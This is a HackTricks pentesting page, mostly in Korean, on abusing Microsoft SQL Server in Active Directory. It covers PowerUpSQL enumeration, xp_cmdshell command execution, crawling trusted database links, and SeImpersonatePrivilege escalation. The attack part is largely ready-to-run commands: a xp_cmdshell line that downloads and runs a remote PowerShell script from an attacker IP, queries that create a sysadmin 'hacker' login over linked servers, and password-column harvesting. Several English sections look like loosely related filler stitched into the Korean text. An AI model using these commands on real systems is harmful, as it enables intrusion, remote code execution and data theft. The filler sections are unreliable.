# MSSQL AD 남용

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로에서 영웅까지 AWS 해킹을 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고하고 싶으신가요**? 아니면 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)와 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>

## **MSSQL 열거 / 탐색**

이 경우에는 powershell 모듈 [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)이 매우 유용합니다.
```powershell
Import-Module .\PowerupSQL.psd1
```
### 도메인 세션 없이 네트워크에서 열거하기

To enumerate from the network without a domain session, you can use the following techniques:

1. **Port Scanning**: Use tools like Nmap to scan the network for open ports on the target machine. Look for ports commonly used by Active Directory (AD) and Microsoft SQL Server (MSSQL), such as TCP port 389 (LDAP) and TCP port 1433 (MSSQL).

2. **Service Enumeration**: Once you have identified open ports, use tools like enum4linux or ldapsearch to enumerate information from LDAP services. This can provide valuable information about the AD infrastructure, including domain names, users, groups, and more.

3. **MSSQL Enumeration**: If you find an open MSSQL port, you can use tools like sqlmap or Metasploit's MSSQL modules to enumerate information from the MSSQL server. This can include database names, tables, columns, and even credentials if they are stored insecurely.

4. **DNS Enumeration**: Enumerate DNS records to gather information about the AD environment. Tools like dnsrecon or nslookup can help you discover subdomains, domain controllers, and other useful information.

5. **SMB Enumeration**: Use tools like smbclient or smbmap to enumerate SMB shares on the target machine. This can provide access to files and directories that may contain sensitive information.

Remember to always perform these enumeration techniques responsibly and with proper authorization. Unauthorized access to systems is illegal and unethical.
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### 도메인 내부에서 열거하기

When conducting a penetration test or security assessment, it is important to gather as much information as possible from within the target domain. This can help identify potential vulnerabilities and weaknesses that can be exploited. In this section, we will explore various techniques for enumerating information from inside the domain.

#### Enumerating MSSQL Servers

MSSQL servers are commonly used in Active Directory environments and can contain valuable information. Enumerating these servers can provide insights into the network architecture and potentially uncover sensitive data.

##### Enumerating MSSQL Instances

To enumerate MSSQL instances within the domain, you can use tools like `sqlcmd` or `osql`. These tools allow you to connect to MSSQL servers and execute queries. By running the following command, you can retrieve a list of available instances:

```plaintext
sqlcmd -L
```

##### Enumerating Databases and Tables

Once you have identified the MSSQL instances, you can further enumerate the databases and tables within each instance. This can be done by connecting to the MSSQL server and executing queries to retrieve the desired information. For example, the following command can be used to list all databases:

```plaintext
SELECT name FROM sys.databases
```

Similarly, you can use the following command to list all tables within a specific database:

```plaintext
USE <database_name>
SELECT name FROM sys.tables
```

By enumerating the databases and tables, you can gain a better understanding of the data stored within the MSSQL servers and potentially identify sensitive information.

##### Extracting Data

In some cases, you may need to extract data from the MSSQL servers for further analysis. This can be achieved by executing queries to retrieve specific data or by exporting entire tables or databases. For example, the following command can be used to export a table to a CSV file:

```plaintext
bcp <table_name> out <output_file.csv> -S <server_name> -T -c
```

By extracting data from the MSSQL servers, you can analyze it offline and potentially discover valuable information.

#### Enumerating LDAP Information

LDAP (Lightweight Directory Access Protocol) is commonly used in Active Directory environments to store and retrieve information about users, groups, and other objects. Enumerating LDAP information can provide insights into the domain structure and potentially reveal sensitive data.

##### Enumerating Users and Groups

To enumerate users and groups within the domain, you can use tools like `ldapsearch` or `dsquery`. These tools allow you to query the LDAP directory and retrieve the desired information. For example, the following command can be used to list all users:

```plaintext
ldapsearch -x -h <domain_controller> -b "dc=<domain_name>,dc=<tld>" "(objectClass=user)"
```

Similarly, you can use the following command to list all groups:

```plaintext
ldapsearch -x -h <domain_controller> -b "dc=<domain_name>,dc=<tld>" "(objectClass=group)"
```

By enumerating the users and groups, you can gain a better understanding of the domain's user structure and potentially identify privileged accounts.

##### Enumerating Group Membership

In addition to enumerating users and groups, it is also important to enumerate group membership. This can help identify users with elevated privileges or specific roles within the domain. The following command can be used to list the members of a specific group:

```plaintext
ldapsearch -x -h <domain_controller> -b "cn=<group_name>,ou=<ou_name>,dc=<domain_name>,dc=<tld>" "(objectClass=user)"
```

By enumerating group membership, you can identify potential targets for privilege escalation or lateral movement.

#### Conclusion

Enumerating information from inside the domain is a crucial step in the Active Directory methodology. By enumerating MSSQL servers and LDAP information, you can gather valuable insights into the target environment and potentially uncover vulnerabilities or sensitive data.
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
### DB 접근

MSSQL 데이터베이스에 접근하는 것은 Active Directory 환경에서의 공격에 매우 유용합니다. MSSQL 서버에 접근하여 데이터베이스에 저장된 정보를 탈취하거나 조작할 수 있습니다.

#### 1. Windows 인증

MSSQL 서버에 Windows 인증을 사용하여 접근할 수 있습니다. 이 경우, 현재 사용자의 Windows 계정을 사용하여 인증합니다. 따라서, 현재 사용자가 관리자 권한을 가지고 있다면, MSSQL 서버에도 관리자 권한으로 접근할 수 있습니다.

#### 2. SQL Server 인증

MSSQL 서버에 SQL Server 인증을 사용하여 접근할 수도 있습니다. 이 경우, 사용자는 MSSQL 서버에 직접 로그인할 수 있는 별도의 계정을 사용합니다. 이 방법은 Windows 인증을 사용할 수 없는 경우에 유용합니다.

#### 3. 기타 인증 방법

MSSQL 서버에 접근하기 위해 다른 인증 방법을 사용할 수도 있습니다. 예를 들어, 암호를 무시하거나, 암호를 우회하여 접근할 수도 있습니다. 또는, 암호 해시를 탈취하여 레인보우 테이블을 사용하여 암호를 크래킹할 수도 있습니다.

### MSSQL 데이터베이스 탐색

MSSQL 서버에 접근한 후, 데이터베이스를 탐색하여 유용한 정보를 찾을 수 있습니다. 다음은 데이터베이스 탐색에 사용할 수 있는 몇 가지 기술입니다.

#### 1. 시스템 데이터베이스

시스템 데이터베이스는 MSSQL 서버의 구성과 관련된 정보를 포함하고 있습니다. 이러한 정보를 통해 서버의 설정, 사용자 계정, 권한 등을 확인할 수 있습니다.

#### 2. 사용자 데이터베이스

사용자 데이터베이스는 실제 데이터가 저장되는 곳입니다. 이 데이터베이스에서는 중요한 정보를 탈취하거나 조작할 수 있습니다. 예를 들어, 사용자 계정 정보, 비밀번호, 개인 데이터 등을 찾을 수 있습니다.

#### 3. 시스템 프로시저

시스템 프로시저는 MSSQL 서버에서 실행되는 저장 프로시저입니다. 이러한 프로시저를 통해 데이터베이스 구조, 테이블, 뷰 등의 정보를 확인할 수 있습니다.

#### 4. 외부 데이터 소스

MSSQL 서버는 외부 데이터 소스에 연결할 수 있는 기능을 제공합니다. 이를 통해 다른 데이터베이스나 파일 시스템에 접근하여 정보를 탈취하거나 조작할 수 있습니다.

### MSSQL 데이터베이스 조작

MSSQL 서버에 접근한 후, 데이터베이스를 조작하여 원하는 결과를 얻을 수 있습니다. 다음은 데이터베이스 조작에 사용할 수 있는 몇 가지 기술입니다.

#### 1. 데이터 조작 언어 (DML)

데이터 조작 언어 (DML)를 사용하여 데이터베이스의 내용을 변경할 수 있습니다. INSERT, UPDATE, DELETE 등의 명령을 사용하여 데이터를 추가, 수정, 삭제할 수 있습니다.

#### 2. 데이터 정의 언어 (DDL)

데이터 정의 언어 (DDL)를 사용하여 데이터베이스의 구조를 변경할 수 있습니다. CREATE, ALTER, DROP 등의 명령을 사용하여 테이블, 뷰, 인덱스 등을 생성, 수정, 삭제할 수 있습니다.

#### 3. 저장 프로시저

저장 프로시저는 MSSQL 서버에서 실행되는 프로그램입니다. 저장 프로시저를 사용하여 데이터베이스 조작을 자동화하거나 복잡한 작업을 수행할 수 있습니다.

#### 4. 외부 데이터 소스

MSSQL 서버는 외부 데이터 소스에 연결하여 데이터를 가져올 수 있습니다. 이를 통해 다른 데이터베이스나 파일 시스템의 데이터를 가져와서 조작할 수 있습니다.
```powershell
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL 원격 코드 실행 (RCE)

MSSQL 호스트 내에서 **명령어를 실행**할 수도 있습니다.
```powershell
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
### MSSQL 기본 해킹 기법

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

## MSSQL 신뢰할 수 있는 링크

만약 다른 MSSQL 인스턴스에 의해 신뢰된다면 (데이터베이스 링크), 사용자가 신뢰된 데이터베이스에 권한이 있다면, **신뢰 관계를 사용하여 다른 인스턴스에서도 쿼리를 실행할 수 있습니다**. 이러한 신뢰는 연쇄적으로 발생할 수 있으며, 어느 시점에서 사용자는 명령을 실행할 수 있는 잘못 구성된 데이터베이스를 찾을 수 있을 것입니다.

**데이터베이스 간의 링크는 포리스트 신뢰를 통해 작동합니다.**

### Powershell 남용
```powershell
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
### Metasploit

Metasploit를 사용하여 신뢰할 수 있는 링크를 쉽게 확인할 수 있습니다.
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
metasploit은 MSSQL에서 `openquery()` 함수만 악용하려고 시도합니다. (따라서 `openquery()`로 명령을 실행할 수 없는 경우 명령을 실행하기 위해 `EXECUTE` 메서드를 수동으로 시도해야 합니다. 아래에서 자세히 알아보세요.)

### 수동 - Openquery()

**Linux**에서는 **sqsh**와 **mssqlclient.py**를 사용하여 MSSQL 콘솔 쉘을 얻을 수 있습니다.

**Windows**에서는 [**HeidiSQL**](https://www.heidisql.com)과 같은 **MSSQL 클라이언트**를 사용하여 링크를 찾고 명령을 수동으로 실행할 수도 있습니다.

_윈도우 인증을 사용하여 로그인:_

![](<../../.gitbook/assets/image (167) (1).png>)

#### 신뢰할 수 있는 링크 찾기
```sql
select * from master..sysservers
```
![](<../../.gitbook/assets/image (168).png>)

#### 신뢰할 수 있는 링크에서 쿼리 실행하기

링크를 통해 쿼리를 실행하세요 (예: 새로운 접근 가능한 인스턴스에서 더 많은 링크 찾기):
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
{% hint style="warning" %}
이중 따옴표와 작은 따옴표가 사용된 위치를 확인하세요. 그렇게 사용하는 것이 중요합니다.
{% endhint %}

![](<../../.gitbook/assets/image (169).png>)

이 신뢰할 수 있는 링크 체인을 수동으로 계속할 수 있습니다.
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
`openquery()`에서 `exec xp_cmdshell`과 같은 작업을 수행할 수 없는 경우 `EXECUTE` 메서드를 사용해 보세요.

### 수동 - EXECUTE

`EXECUTE`를 사용하여 신뢰할 수 있는 링크를 악용할 수도 있습니다.
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## 로컬 권한 상승

**MSSQL 로컬 사용자**는 일반적으로 **`SeImpersonatePrivilege`**라는 특별한 권한을 가지고 있습니다. 이는 계정이 "인증 후 클라이언트를 표현할 수 있는" 권한을 부여합니다.

많은 작성자들이 고안한 전략은 시스템 서비스를 강제로 로그인하도록 하여, 공격자가 생성한 위조 또는 중간자 서비스에 인증하게 하는 것입니다. 이러한 위조 서비스는 시스템 서비스가 인증을 시도하는 동안 시스템 서비스를 표현할 수 있습니다.

[SweetPotato](https://github.com/CCob/SweetPotato)는 Beacon의 `execute-assembly` 명령을 통해 실행할 수 있는 이러한 다양한 기술들의 모음입니다.

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로에서 영웅이 되는 AWS 해킹을 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하고 계신가요? **회사를 HackTricks에서 광고하고 싶으신가요**? 또는 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 **저를 팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)와 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 여러분의 해킹 기법을 공유해주세요.

</details>
